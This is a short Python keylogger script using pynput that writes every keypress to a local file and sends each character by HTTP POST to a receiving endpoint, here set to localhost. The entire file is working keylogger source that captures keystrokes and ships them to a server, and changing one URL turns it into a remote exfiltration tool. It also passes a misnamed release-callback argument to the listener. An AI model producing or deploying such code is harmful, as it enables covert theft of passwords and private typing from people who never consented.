from pynput.keyboard import Key, Listener
import requests

API_URL = "http://localhost:9000/receive"
LOG_FILE = "log.txt"

def on_key_press(key):
    try:
        print("Key Pressed: ", key)

        # Convert key to a string without quotes
        k = str(key).replace("'", "")

        # Handle special keys
        if key == Key.space:
            k = " "
        elif key == Key.enter:
            k = "\n"
        elif "key" in k.lower():
            # Ignore other special keys like shift, ctrl, etc.
            return

        # Write immediately to local file
        with open(LOG_FILE, "a") as f:
            f.write(k)

        # Send the character to the API
        send_to_api(k)

    except Exception as ex:
        print("There was an error: ", ex)

def send_to_api(char: str):
    try:
        r = requests.post(API_URL, json={"content": char}, timeout=2)
        print(f"Sent '{char}' -> {r.status_code}")
    except Exception as e:
        print(f"[!] Send failed: {e}")

def on_key_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_key_press, on_key_release=on_key_release) as listener:
    print("Start key logging...")
    listener.join(timeout=15)
    print("End key logging...")
